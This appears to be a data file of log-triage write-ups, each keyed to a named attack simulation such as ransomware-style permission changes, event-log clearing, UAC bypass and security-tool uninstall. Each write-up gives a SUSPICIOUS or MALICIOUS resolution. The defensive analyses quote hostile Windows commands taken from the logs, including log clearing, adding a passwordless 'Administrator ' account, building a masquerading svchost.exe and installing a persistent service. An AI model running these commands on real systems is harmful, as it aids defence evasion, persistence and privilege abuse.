- The logs contain behaviors that don't align with expected everyday usage patterns, particularly the scripted process activities by a privileged user account. Further investigation is recommended to ensure these activities are legitimate and not indicative of a script or tool used for malicious purposes.

### Guidance on Proceeding:
- Verify the legitimacy of the administrative account `admin_test` and its intended operations.
- Investigate the purpose and context of the `Rundll32.exe apphelp.dll` command, ensuring it's not misused.
- Examine whether the frequent execution of `wevtutil.exe` and `conhost.exe` corresponds with known tasks or an automated process.
- Confirm that the Microsoft Edge updates correlate with standard update logs and schedules to rule out tampering or abuse.

Additionally, consulting with the user or system owner for recent activities can establish a baseline of expected behavior and clarify the legitimacy of these entries."
Terminal Server Client Connection History Cleared,"Upon examining the provided logs from the Windows host, several events are notable for analysis:

1. **Process Execution:**
   - Multiple executions of `powershell.exe`, `conhost.exe`, `cmd.exe`, and various `reg.exe` processes initiated by the user ""SERVER002\\admin_test"". These processes before the Edge updates could indicate administrative script executions or potential preparatory activity for further actions.
   - The presence of `wevtutil.exe` indicates modification or querying of event logs, which is sometimes associated with attack cleanup activities to remove traces.

2. **Command Line Arguments:**
   - The `cmd.exe` process executed a registry deletion command: `""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"" /f`. This command deletes remote desktop client-related registry keys, which can suggest an attempt to clean up remote access indicators or prepare the machine for stealth access.

3. **Privilege Escalation or System Operations:**
   - The execution of processes under ""NT AUTHORITY\\SYSTEM"", especially related to Microsoft Edge updates, appears legitimate at first glance, as browser updates typically require elevated privileges. However, the volume and sequence are unusually high.

4. **Indicators of Malicious Activity:**
   - The preoccupation with registry edits related to Remote Desktop suggests an attempted or ongoing alteration or evasion effort post-access.
   - Large-scale invocation of Edge update processes and related binaries could suggest side-loading attacks if inconsistencies in expected behavior or file details existed, but none are inherently found anomalous here beyond suspicious volume and execution context.

5. **Edge Update Activities:**
   - Extensive `MicrosoftEdgeUpdate` process activities are normally observed in mass enterprise environments due to browser updates, although their alignment timing with `wevtutil.exe` invocation warrants closer scrutiny.

**Assessment:**

The logs contain numerous activities that, while parallel to administrative and update tasks, also match patterns of persistence and cleanup post-compromise. The registry operation via `cmd.exe`, simultaneous use of PowerShell and command utilities, and Edge-related process invocations under the system authority — all occurring in a condensed time frame — warrant caution.

**Resolution: SUSPICIOUS**

The provided logs indicate activities that could be benign (system maintenance and updates) but also align with tactics often used by adversaries post-infiltration or pre-exfiltration. Thus, further investigation, particularly into the origin of user ""SERVER002\\admin_test"" actions, cross-referencing with known update schedules and file integrity checks of involved binaries, is recommended to confirm or dismiss suspicions. Steps should include:
- Verifying the user `admin_test` legitimacy and recent activity logs outside these provided.
- Using endpoint protection logs and network data to cross-reference for any known Indicators of Compromise (IoCs).
- Direct review or revert to backups preceding the indicated timeline to check for unintended alterations."
Running DLL with .init extension and function,"Upon analyzing the provided Windows event logs across various channels, here's a detailed assessment:

1. **Windows PowerShell Log Analysis:**
   - Multiple PowerShell events (EventID 600) indicate the execution of `rundll32.exe` with a command line pointing to a suspicious file path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl`. 
   - Using `rundll32.exe` to execute DLLs or initiate processes from temporary directories is a known method used by malware to execute code. The path and naming convention further raise suspicion, as temp directories are uncommon for legitimate DLL execution.

2. **Sysmon Log Analysis:**
   - Numerous Sysmon EventID 1 and EventID 5 entries document the execution of processes, such as `powershell.exe`, `cmd.exe`, and `rundll32.exe`, all within a very short time frame, and all reference the same `Temp` directory path.
   - The sequence of events suggests a potentially scripted or automated activity, consistent with the behavior of some types of malware or malicious scripts using PowerShell to initiate attacks.
   - The use of `rundll32.exe` to execute from a Temp path is a red flag for unauthorized or malicious activity, aligning with the PowerShell log findings.

3. **Allocating Common Legitimate Processes:**
   - Several entries (e.g., `svchost.exe`, `whoami.exe`, and `conhost.exe`) appear with processes like `svchost.exe` running as `NT AUTHORITY\SYSTEM`, which can be common in normal Windows operations. However, their association in these logs with other suspicious activities raises concern.
   - Given that whoami.exe and conhost.exe are regularly used utilities, the unique aspect here is their timed execution proximity with the suspicious processes.

4. **Application and Security Logs:**
   - The Application log features a benign entry related to software protection (EventID 16384). This does not directly imply malicious activity.

**Overall Assessment:**
- The persistent theme of unusual PowerShell and rundll32 activity correlating with Temp directory execution strongly suggests the presence of potentially malicious activity. Notably, the execution from such directories can often be indicative of in-memory or file-based malware execution techniques.

As per the findings, the conclusion is:
- **Resolution: MALICIOUS**

**Guidance on Proceeding:**
1. **Isolation and Containment**: Immediately isolate the affected host from the network to prevent potential lateral movement across the network.
2. **Incident Response**: Engage the incident response team to further investigate the context and origin of the suspicious DLL and PowerShell commands.

Event Log Manipulations- Time slipping via Powershell,"**Detailed Analysis of Windows Event Logs:**

Upon analyzing the provided Windows event logs, several observations related to suspicious activities were noted, particularly the behavior involving Windows PowerShell and specific system processes.

**1. Unusual PowerShell Activity:**
   - **PowerShell Script Execution**:
     - The PowerShell logs indicate the execution of a script that modifies the system date by adding three days to the current date (`Set-Date -Date (Get-Date).AddDays(3)`) and logs this change to a file (`Add-Content ""$env:APPDATA\slipDays.bak"" 3`). This activity was initiated by the user `admin_test`.
     - Changing system time and logging are activities that might be indicative of an attempt to alter system logs to obfuscate malicious actions or to bypass time-based defenses like expiration of security tokens or cert validation. 

**2. Potential Time Manipulation:**
   - The Security log `EventID 4616` confirms that a time manipulation occurred: the time was set backward from `2024-10-26` to `2024-10-23`, which matches the PowerShell manipulation activity. This event was executed by `powershell.exe` for the user `admin_test`.

**3. System Process Execution Patterns:**
   - Multiple instances of the `wevtutil.exe` and `conhost.exe` are logged; these processes are used for Windows Event utilities, which in isolation may not be suspicious, but their volume and timing around the PowerShell execution elevates concerns as these processes can be utilized for clearing or altering event logs.
   - Instances of system processes like `CompatTelRunner.exe` and others related to Microsoft Edge updates are observed which appear as regular system events.

**4. Elevated Privileges:**
   - Security log `EventID 4672` shows that user `admin_test` obtained elevated privileges, which includes `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, and SeDebugPrivilege`. 

**5. Time Changes Validation:**
   - The Kernel-General logs confirm multiple time changes corresponding to the actions performed by PowerShell.

**6. Summary of Events:**
   - The combination of altering system date using PowerShell and processes associated with event and log management (like `wevtutil.exe`) could indicate attempts to manipulate system time to potentially hide or backdate unauthorized activities.

**Resolution:**
Given the above details, the activity documented in the provided logs is classified as **SUSPICIOUS**. We recommend further investigation to determine the intent and scope of the time manipulation and whether it was used to facilitate further unauthorized activities.

**Guidance on How to Proceed:**
1. **Conduct a Comprehensive Review**: Review any changes made during the manipulated time frame to ensure data integrity and verify that no unauthorized access occurred.
2. **Audit User Actions**: Check for any additional suspicious activities associated with `admin_test`, especially those altering system security settings.

Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"### Detailed Analysis

Upon examining the provided logs from the Application, Sysmon, Security, System, and Windows PowerShell logs, the following points of interest and analysis were noted:

1. **Application Log:**
   - The `edgeupdate` service has been stopped multiple times. While not inherently malicious, frequent starts and stops of update services can sometimes indicate tampering or troubleshooting issues with the update process.
   - The `Microsoft-Windows-Security-SPP` log references `RulesEngine`, which appears standard as it's part of Microsoft's Software Protection Platform.

2. **Sysmon Log:**
   - **Frequent Use of System Utilities:**
     - Multiple instances of `wevtutil.exe` and `conhost.exe` by user `SERVER002\admin_test` were recorded. Typically, `wevtutil.exe` is used to manage events and event logs, and excessive use might indicate log tampering. However, further investigation is needed to determine if these were legitimate administrative tasks.
   - **Command Execution:**
     - An entry showing execution of `cmd.exe` with the command:
       ```cmd
       ""cmd.exe"" /c icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q
       ```
       Grants full control permissions to the `Everyone` group on files in `C:\Users\Public`. This is highly suspicious as it weakens the security posture of the system and may indicate an attempt to enable unauthorized access to files.
   - **Usage of WHOAMI and HOSTNAME:**
     - Usage of `hostname.exe` and `whoami.exe` by `admin_test` is peculiar, as these commands are often used by attackers post-exploitation to understand the system and user context.
   - **Microsoft Edge Updates:**
     - A large number of log entries related to `MicrosoftEdgeUpdate.exe` activities. While this might be a legitimate software update, the sheer volume could suggest an anomaly, especially if it deviates from the usual update pattern for this system.

3. **Security Log:**
   - Time synchronization events indicate a regular update from `time.windows.com` with no adjustments to critical security settings noted.

4. **System Log:**
   - Multiple time changes occurred in a very short time period. This might indicate time zone synchronization issues but is not directly indicative of a compromise.

### Assessment and Resolution

Based on the analysis:

- The frequent use of system utilities like `wevtutil.exe` and the granting of global file permissions is concerning and deviates from usual activity.
- The presence of tools like `whoami.exe` and `hostname.exe`, while not inherently malicious, could suggest reconnaissance activity if unauthorized.
- The activity surrounding the Microsoft Edge updater is excessive compared to what's typically expected of an update process.

Given these observations, I would classify this activity as **SUSPICIOUS**. The actions observed suggest that further investigation is required to determine if these were authorized administrative actions or indicative of malicious activity using valid credentials. Specifically, logs on user activity, user logins, process executions, and any network connections should be further scrutinized. Investigating the context around the use of `icacls` would be critical to understanding potential implications for data security.

### Guidance on How to Proceed

1. **Verification of User Activity:**
   - Confirm if the `admin_test` account's use of commands and tools was legitimate by contacting the user or reviewing additional logs to verify authorized use.
   
2. **Examining File Permissions Changes:**
   - Review any modifications to file permissions in `C:\Users\Public\` to prevent unauthorized file access. Check if the `icacls` command was executed intentionally.

3. **Security Monitoring and Alerts:**
   - Set up alerts for unusual activity especially regarding the use of `cmd.exe`, `icacls.exe`, and `wevtutil.exe`.
   
4. **Edge Update Validation:**
   - Confirm the legitimacy of the Microsoft Edge updates by checking with the software version control logs or contacting the IT department for known update windows.

5. **Penetration Test or Audit:**
   - Consider running a security audit or penetration test to determine if these suspicious activities are symptomatic of broader security issues."
Activate Windows NoTrayContextMenu Group Policy Feature,"### Analysis of Windows Event Logs

#### Indicators of Potential Malicious Activity:

1. **Execution of `cmd.exe` with Registry Modification:**
   - The `cmd.exe` process was observed with a command line that modifies the registry key:
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
     ```
   - This command disables the context menu on the taskbar, which is suspicious as it may indicate an attempt to restrict user interface interactions. Such changes are rarely needed by legitimate applications.

2. **Frequent Execution of `wevtutil.exe`:**
   - Multiple instances of the process `wevtutil.exe` (event ID 5) executed within a very short time frame. While `wevtutil.exe` is a legitimate utility used to manage event logs, its frequent and automated use might indicate attempts to clear or monitor the event logs for stealth reasons.

3. **High Integrity Level of Executed Processes:**
   - Several processes were executed with a high integrity level, suggesting administrative privileges. This includes the `cmd.exe` instance that performed registry modifications. Malicious actors often require elevated privileges for persistent changes.

4. **Odd Timing of System Time Adjustments:**
   - The system time was changed multiple times in quick succession by the `svchost.exe` process. While not inherently malicious, altering system time can sometimes be related to or supportive of malicious activities, particularly in the context of log tampering.

5. **Absence of Details in Edge Update Logs:**
   - The `MicrosoftEdgeUpdate` processes showed repetitive and detailed logging of update activities, which appear legitimate, although no anomalies are observed directly. The presence of unexpected or unnecessary update activities may be worth future monitoring depending on additional context.

#### Threats or Risks Identified:
- The registry change executed by `cmd.exe` is a significant indicator due to its potential impact on user interaction with the system and its correlation with malicious activity patterns.
- The repetitive and grouped use of `wevtutil.exe` by the same user account raises audit concerns about potential event log tampering.

#### Assessment:
Based on the indicators provided, the activity in the log files can be characterized as **SUSPICIOUS**. There are signs of potentially abusive behavior, particularly with the unauthorized registry modification and the repeated invocation of a system utility that might imply possible covering up of traces.

### Guidance on How to Proceed:

- **Investigate the Source:** Determine the user action or process that triggered the command execution modifying registry settings. This can be achieved by correlating the timestamp and process ID with known user activities or scheduled tasks.
  
- **Increase Monitoring:** Set up alerts for similar process execution patterns, especially those involving registry changes and `wevtutil.exe` activity, to quickly identify potential compromises in the future.

- **Conduct a Security Review:** Review all users and processes with administrative privileges on Server002 to ensure only authorized users and applications maintain elevated permissions.

- **Consider a System Audit:** Perform a forensic analysis focusing on any files or artifacts potentially altered during the suspicious activities, especially around the times these activities occurred.

Having identified unusual and potentially harmful activities, it is recommended to take these steps to ensure system integrity and security while further investigating the root cause and actor behaviors."
Uninstall Crowdstrike Falcon on Windows,"Based on the analysis of the provided logs, the primary areas of interest for potential malicious activity include:

1. **Event ID 4624 (Logon Event)**: This log often indicates a successful sign-in. The log shows a Logon Type 5, used for service logons, which is typical in the case of services starting up. The process involved is `C:\Windows\System32\services.exe`, which is a legitimate system process.

2. **Event ID 4672 (Special Privileges Assigned)**: The `SYSTEM` account is assigned several privileges. While these privileges can be leveraged by malware to execute privileged operations, the SYSTEM account inherently has high privileges on a system, and it is common to see such assignments in logs.

3. **Repeated Event ID 5379 (Credential Validation)**: These logs indicate attempts by the `SERVER002$` computer account to retrieve credentials for various targets like `MicrosoftAccount` and `WindowsLive`. The return code `3221226021` typically indicates access is denied, suggesting these attempts did not succeed. These might be benign administrative actions or automated tasks attempting to verify accounts.

4. **Event ID 4798 (Enumeration of User Accounts)**: Legitimate processes like `C:\Windows\System32\taskhostw.exe` are enumerating the user accounts. While the enumeration of accounts can be indicative of malicious reconnaissance, the fact that it originates from a legitimate task host process lowers suspicion.

5. **Sysmon Logs**: Legitimate processes such as `MpCmdRun.exe`, `conhost.exe`, `wevtutil.exe` executed under expected accounts such as `NT AUTHORITY\SYSTEM` and `SERVER002\admin_test` mostly indicate regular system operations. The PowerShell command logged is looking for a specific Windows component related to CrowdStrike and attempts to uninstall it if found, suggesting administrative maintenance or script-driven operation, albeit it should be confirmed if this was initiated by a legitimate admin or user action.

6. **Command Execution (PowerShell)**: The PowerShell logs show commands aimed at uninstalling the CrowdStrike component quietly. While it appears script-driven and tries to validate signing certificates, such operations should be verified to ensure they were initiated by authorized personnel or automated scripts for legitimate purposes.

7. **Edge Updates**: A series of updates and related processes for Microsoft Edge are logged. These appear routine in nature for a system maintaining its software through updates.

**Assessment**:
- The log entries primarily reflect routine system operations, including account enumerations, typical for service management and system activities.
- The unauthorized attempts to validate credentials suggest probing or errant configuration by system processes but did not succeed.
- The PowerShell activity indicates a system change that should be verified for legitimacy, ensuring authorized personnel initiated it.

**Final Resolution**: **SUSPICIOUS** - While most activity seems typical and benign, the credential checks and PowerShell command related to CrowdStrike warrant further investigation to confirm the legitimacy of these actions and ensure no unauthorized changes were made. Further verification with network traffic and user activity logs could provide additional context."
LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"Based on the provided logs from various sources (System, Windows PowerShell, Sysmon, Application, and Security), the analysis reveals the following:

### Anomalies and Observations

1. **Time Changes**:
   - Multiple instances where system time has been adjusted backward around the same timestamp (`09:46:15`). This behavior is logged in both the System and Security logs.
   - Time changes are usually indicative of either a misconfiguration or an attacker trying to avoid detection by altering timestamps. Such changes were performed by `svchost.exe` under the `LOCAL SERVICE` account.
   
2. **PowerShell Activity**:
   - Windows PowerShell logs indicate the execution of a command to modify a registry key:
     ```
     New-ItemProperty ""HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE"" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force
     ```
   - Command modifies Windows privacy settings, which can indicate an attempt to disable certain user experience features, potentially to avoid privacy prompts or alerts.

3. **Process Creation Events**:
   - Sysmon logs show typical process creation logs for administrative tasks including `whoami.exe`, `conhost.exe`, and multiple instances of `wevtutil.exe`. These suggest an admin may have been verifying user information or services.
   - Frequent process creation events for `MicrosoftEdgeUpdate.exe` and other Microsoft Edge Update components indicate standard update activity. This observed activity is expected and aligns with legitimate software maintenance operations.

4. **System Changes Logged as Edge Updates**:
   - Application logs show service stops align with Edge Updates, which corroborates with Sysmon logs. These seem legitimate as they relate to Microsoft Edge updates and are not unusual or suspicious in a corporate environment.

### Assessment

- The **time modification** event by `svchost.exe` raises an initial suspect due to its potential use for malicious purposes; however, there's no further corroborating evidence in the logs of misuse or any unauthorized access following these changes.
- The **PowerShell command** ran could be suspicious if it was executed without explicit administrative intent, due to the privacy settings modification. It doesn't align with standard operations unless justified by a legitimate administrative task.
- The **Sysmon logs** and other system activities, including Edge updates, appear to be benign, based on the observed standard software behavior and expected maintenance periods.

### Conclusion

Given the information provided, the logs contain a mix of typical administrative activities and some potentially suspicious actions that may warrant further investigation. Specifically, the unusual time adjustments and PowerShell script execution need verification.
 
### Recommended Action: 

Proceed with the resolution **SUSPICIOUS**.

This means conducting further investigation to confirm if the `svchost.exe` actions and PowerShell changes were intended maintenance activities, checking the legitimacy of the `admin_test` user actions during this timeframe, and ensuring no further unauthorized changes were made."
Delete System Logs Using Clear-EventLog,"After reviewing the provided Windows event logs, here is my analysis:

### System Log
The system logs primarily involve time change events managed by `svchost.exe`. The Kernel-General event logs (EventID 24 and 1) show the system time being adjusted. These changes originate from the `svchost.exe` process, which is legitimate behavior when the system synchronizes time with time servers. The Microsoft-Windows-Time-Service event logs indicate that `time.windows.com` is the time source, which is expected behavior.

### Sysmon Log
- **Process Creation Logs (EventID 1)**: Numerous legitimate Windows processes are listed, such as `whoami.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `wsmprovhost.exe`. These are commonly used system processes, and their usage appears normal in this context.
  
- **Network Connections and File Events (EventID 5)**: There are notification logs for `wevtutil.exe` and `conhost.exe`. The presence of `wevtutil.exe` could be typical as it interacts with event logs but could also be suspicious if used to clear logs maliciously in some contexts.

- **PowerShell Activity**: A significant activity detected involves the execution of `powershell.exe` with commands to clear event logs (`powershell.exe & {$logs = Get-EventLog -List | ForEach-Object {$_.Log}, $logs | ForEach-Object {Clear-EventLog -LogName $_ }, Get-EventLog -list}`). This is a notable red flag indicating potential log tampering, which is often used during malicious activities to hide tracks.

### Application Log
Logs from `edgeupdate` show typical operations related to updating Microsoft Edge, including a ""Service stopped"" event, which may not immediately be a cause for concern unless it's anomalous with known updates/releases.

### Security Log
Time change events (EventID 4616) show that the system time was altered by `LOCAL SERVICE` using `svchost.exe`, aligning with the system log. No explicit privilege escalation or login anomalies are present.

### Windows PowerShell Log
A record showing stopped states (EventID 403) from PowerShell indicates that PowerShell was used, consistent with the Sysmon logs where event logs were cleared using PowerShell, suggesting potentially malicious behavior.

### Conclusion
The event logs suggest that:
- Normal Windows processes and tasks have been executed.
- PowerShell activity includes commands to clear event logs, which is a significant indicator of malicious intent.

### Assessment
Given the above analysis, the activity appears suspicious primarily due to the use of PowerShell to clear the event logs. This behavior warrants further investigation to ensure there is no hidden malicious activity or compromise.

**Resolution: SUSPICIOUS**

### Guidance
- Investigate the context around the PowerShell usage and determine if it was an authorized administrative task.
- Review any additional logs, including security logs outside this timeline, to identify other potentially hidden activities.
- Confirm whether there were legitimate updates or maintenance activities scheduled that could explain the PowerShell usage."
Create an Administratoruser (with a space on the end),"Upon analyzing the provided Windows event logs, several activities stand out that are indicative of potentially malicious behavior:

1. **Suspicious PowerShell Execution**:
   - A PowerShell command was executed with the intention of creating a new user account named ""Administrator "" without a password, which is generally abnormal and a red flag because creating users with administrative privileges without passwords is not standard practice and can indicate a security breach or malicious intent.
   
   - Entries from the Sysmon log and PowerShell logs corroborate this action indicating high-integrity level access was used to attempt this operation (`EventID 1` and PowerShell EventID `600`).

2. **Security Log Entries**:
   - Events within the Security logs (EventID `4720`) show that a new account ""Administrator "" was created. This action was performed by the user `admin_test`, which aligns with the PowerShell activity.
   
   - The account creation is coupled with EventID `4722` indicating the account was enabled, and EventID `4738` suggesting modification of account properties, further pointing to unauthorized account manipulation actions.
   
3. **Time Manipulation Events**:
   - The `Security` logs show time changes (EventID `4616`), which is atypical and possibly indicative of malicious attempts to manipulate system logs or alter event times to conceal unauthorized activity.

Given these observations, the activities captured in the logs, particularly the creation of administrative accounts without a password and the subsequent enabling and modification of the account, alongside unauthorized time manipulation attempts, highly suggest a compromise or serious security threat.

### Assessment:
In conclusion, the combination of unauthorized user account creation and administrative time adjustment strongly indicates malicious intent. Based on the evidence, the activity within these logs appears to be malicious.

### Recommended Action:
- **Resolution**: MALICIOUS
- **Immediate Steps**:
  1. Disable the suspicious ""Administrator "" account immediately if still active.
  2. Investigate and remove any unauthorized accounts or changes made to user roles or permissions.
  3. Review security policies and enact stricter access controls, particularly around PowerShell execution and account management.
  4. Conduct a comprehensive forensic analysis to understand the origin of the breach and ensure no other backdoors or unauthorized changes were made within the system.
  5. Patch any vulnerabilities that may have enabled unauthorized access.
  6. Monitor systems closely for further suspicious activity."
Masquerade as a built-in system executable,"Upon analyzing the provided Windows event logs from the Windows host ""Server002,"" the following events and activities warrant a closer examination:

### Windows PowerShell Log Analysis:
- **Indicators of Malicious Activity:** 
  - Multiple logging events reveal execution of a PowerShell script with command-line: 
    ```powershell
    powershell.exe & {Add-Type -TypeDefinition @'
    public class Test {
        public static void Main(string[] args) {
            System.Console.WriteLine(""tweet, tweet"");
        }
    }
    '@ -OutputAssembly ""$Env:windir\Temp\svchost.exe""
    Start-Process -FilePath ""$Env:windir\Temp\svchost.exe""}
    ```
  - The PowerShell script compiles a C# class and outputs an executable named `svchost.exe` in the `C:\Windows\Temp\` directory, then executes the file.

- **Unusual Aspects:**
  - Legitimate `svchost.exe` processes run in `C:\Windows\System32\`, not in temporary directories, indicating potential masquerading.
  - Using PowerShell to compile and execute binaries is a known tactic for malware, especially for evading detection.

### Sysmon Log Analysis:
- Lists several process creations, one notably involving the execution of the independently compiled `svchost.exe` from the temp folder:
  - `C:\Windows\Temp\svchost.exe` executed by PowerShell.
- The parent process for `svchost.exe` is the previously mentioned PowerShell script, reinforcing suspicion.
- Use of `csc.exe` (C# compiler) and `cvtres.exe` in tandem with the creation of non-standard executables.

### System, Security, and Application Log Analysis:
- **Normal Activity:** System updates and Windows Defender logging seem to operate as expected with regular updates to definitions.
- **Security Log:** Shows events related to credential reading but returns errors (3221226021), potentially indicating attempts to use accounts or retrieve credentials unsuccessfully.

### Assessment:
- The compilation and execution of `svchost.exe` outside of its normal operating directory through PowerShell is highly suspect.
- The behavior is suggestive of a script being used to introduce potentially harmful code or to evade traditional process-checking mechanisms.
  
### Threat/Risk Identified:
- This sequence of actions aligns closely with tactics used in fileless malware or living-off-the-land (LotL) techniques, which describe the exploitation of already installed software and functions to carry out attacks.

### Guidance on Steps to Proceed:
1. **Immediate Isolation:** Quarantine the affected host (""Server002"") to prevent potential lateral movement.
2. **Malware Analysis:** Analyze the contents of `svchost.exe` from the `C:\Windows\Temp\` directory.
3. **Threat Hunt:** Check systems for other signs of similar scripts or unauthorized PowerShell executions.
4. **Review Security Measures:** Validate endpoint security controls, ensuring comprehensive PowerShell script block logging and execution audits.
5. **User Privileges Review:** Assess and limit privileges for accounts observed executing the suspicious PowerShell.

**Resolution: MALICIOUS** - The logs contain patterns indicative of malicious activity, specifically the unauthorized compilation and execution of a suspicious executable under the guise of a legitimate system process (svchost.exe). Immediate action is advised to contain, analyze, and remediate potential threats on the network."
Event Viewer Registry Modification - Redirection Program,"Upon careful analysis of the provided windows event logs across the PowerShell, Sysmon, Security, Application, and System logs, I have identified several points worth noting:

### Analysis:

1. **Sysmon Log Analysis**:
   - Regular processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `svchost.exe`, and `sppsvc.exe` are observed executing with the user `SERVER002\\admin_test`. These are common processes in Windows and normally not suspicious when executed.
   - The process `cmd.exe` executed with a command to alter the registry key under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer` with `notepad.exe` as a redirection target. 
   - Registry changes via `reg.exe` are often used by malware for persistence or privilege escalation. The command involves redirecting execution of Event Viewer through `notepad.exe` which is unusual behavior and can be characteristic of hiding malicious activity or obfuscating logs.

2. **Security Log Analysis**:
   - A logon event (ID 4624) using NTLM authentication with elevated privileges is recorded for user `admin_test`. The presence of privileged rights (e.g., `SeDebugPrivilege`) could potentially be escalated if improperly handled or by unauthorized users.

3. **Application and System Log Analysis**:
   - A change in system time is noted (Event ID 4616), but the context suggests a potential time adjustment by the system and not something actively tampered with by a user.
   - Other logged processes in these logs (TrustedInstaller, svchost) run under `NT AUTHORITY\SYSTEM`, indicating normal system maintenance background tasks.

### Assessment:

- **Command Execution and Registry Modification**:
  The command execution through `cmd.exe` to modify the registry without an apparent administrative task suggests potential unauthorized or suspicious behavior.

- **Privilege Escalation Potential**:
  The security log reveals a user (admin_test) logging in with elevated privileges. While this could be legitimate for an admin account, in concert with registry modifications, this context heightens suspicion.

- **High Privilege and Anomalous Commands**:
  While high privilege use by an administrator is often necessary, combined with the behavior of changing registry keys serves as a clear indicator of possible misuse or nefarious activity.

### Resolution:

**SUSPICIOUS**

### Guidance:

Further investigation is necessary, particularly around:
- Validating the intent behind the execution of registry modification commands.
- Confirming if `admin_test` user actions correlate with legitimate administrative tasks.
- Reviewing broader event history or system activity for more context on targeted regedit actions—especially within the timeframe of interest.
- Consider implementing tighter scrutiny or alerting mechanisms for registry changes initiated via command-line tools, especially when not aligned with known IT maintenance windows or tasks."
UACME Bypass Method 34,"Based on the provided log entries, here's a detailed analysis focusing on any indicators of suspicious or malicious activity:

1. **Unusual Process Execution**:
   - The execution of `cmd.exe` with the command line mentioning `Akagi64.exe` stands out. The path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\uacme\\34 Akagi64.exe` suggests potential usage of UACME, a known tool for bypassing User Account Control (UAC) in Windows. This is linked with activities that might aim for privilege escalation without notifying the user. This is a strong indicator of suspicious activity.

2. **Command-Line Arguments**:
   - The specific command-line arguments for the `cmd.exe` process involve paths and file names that hint at potential exploitation. The use of seemingly obfuscated or non-standard paths could be an attempt to avoid detection by defensive tools.

3. **Associated Processes**:
   - The process `powershell.exe` was involved just before `cmd.exe`, with a similarly suspicious command. Powershell is often abused by attackers due to its ability to execute scripts and commands directly in memory, avoiding files being written on disk, which could be captured easily.
   
4. **Privilege Escalation**:
   - The logs do not show explicit privilege escalation through Windows events, but if `Akagi64.exe` is indeed part of UACME operations as guessed from the path, it attempts to elevate privileges using pre-existing vulnerabilities or bypasses in UAC.

5. **Processes Running as SYSTEM/High Integrity**:
   - Several processes, such as those related to `MicrosoftEdgeUpdate.exe`, are running with SYSTEM-level privileges. While the Edge Update process typically runs with high privileges, ensuring these are legitimate operations and not spoofed or tampered with is crucial.

6. **Hashes**:
   - The hash for `Akagi64.exe` (SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0) could be checked against threat intelligence databases to verify if it is a known malicious file.

Considering these points, the log entries contain behavior that suggests potential malicious activity, possibly involving the use of tools to bypass UAC for privilege escalation. 

**Final Assessment**: **MALICIOUS**

**Guidance**:
- Validate the hash of `Akagi64.exe` against known databases.
- Quarantine and investigate the `Akagi64.exe` file.
- Analyze the `powershell.exe` script further to understand its operation.
- Review security patches and configurations to ensure no exploited UAC vulnerabilities exist.
- Enhance monitoring and alerting for unusual command line executions and audit administrative tool use like Powershell and CMD."
Execution of program.exe as service with unquoted service path,"Based on the detailed analysis of the provided Windows event logs, here are the findings:

1. **Security Log Entries (EventID 4616)**:
   - These logs represent system time changes associated with the svchost.exe process, run by the LOCAL SERVICE account. While reassignment of time is a normal operation, frequent or unexplained changes could be indicative of tampering. However, in this instance, there doesn't seem to be any pattern suggesting malicious activity with just time adjustments.

2. **Sysmon Log Entries**:
   - A sequence of process creations involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` is observed.
   - The command line for `cmd.exe` launching suggests potentially malicious activity:
     ```
     ""cmd.exe"" /c copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\WindowsServiceExample.exe"" ""C:\\Program Files\\windows_service.exe"" & copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\WindowsServiceExample.exe"" ""C:\\program.exe"" & sc create ""Example Service"" binpath= ""C:\\Program Files\\windows_service.exe"" Displayname= ""Example Service"" start= auto & sc start ""Example Service""
     ```
   - The use of `sc create` and `sc start` commands to create and start a new service (Example Service) suggests the installation of a service potentially without proper authorization, which can be a method used for persistence by malware or unauthorized users.
   - The parent process for these actions is `wsmprovhost.exe`, which is a legitimate Windows service hosting tool for PowerShell remoting tasks. However, its usage in this context for such tasks by `admin_test` appears suspicious.

3. **System Log Entries**:
   - There is a log entry confirming the creation of the ""Example Service,"" which aligns with the suspicious command line activity noted in the Sysmon logs.
   - Subsequent events show failures associated with the service (Event ID 7000 indicating service start failures), suggesting possible misconfiguration or failed execution, potentially due to defenses on the system blocking successful execution.

4. **Application and Windows PowerShell Logs**:
   - The PowerShell log does not contain entries, which doesn't provide additional context for the cmd.exe or service manipulation events.
   - The Application logs contain SPP-related information, quite typical and not directly related to the suspicious activity.

**Assessment and Conclusion**:
The composite view of these logs suggests a possible compromise scenario where an unauthorized execution path is leveraged to introduce a service for persistent access or additional exploitation avenues. While svchost.exe, wevtutil.exe, conhost.exe, and other processes can be benign, their coordinated use alongside suspicious commands suggests further scrutiny is warranted.

Resolution: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a deeper forensic analysis of the account ""admin_test"" to determine the origin of the commands and any abnormal patterns of activity.
- Perform integrity checks on the mentioned binaries (especially `WindowsServiceExample.exe`) to identify any signs of tampering or malicious payload.
- Confirm with IT staff or administrative logs if the service creation aligns with legitimate administrative activities.
- Review additional logs (File Audit, Network) for lateral movement or data exfiltration attempts.
- Depending on findings, consider isolating the host to prevent potential spread and conducting a thorough malware scan."
Kill Event Log Service Threads,"## Detailed Analysis of Windows Event Logs

### Observations:

1. **System Log:**
   - The logs mostly capture time changes through the Windows Time Service and general kernel events. 
   - The adjustments in time appear to be valid operations performed by `svchost.exe`, which is a normal process, typically not suspicious on its own.

2. **Sysmon Log:**
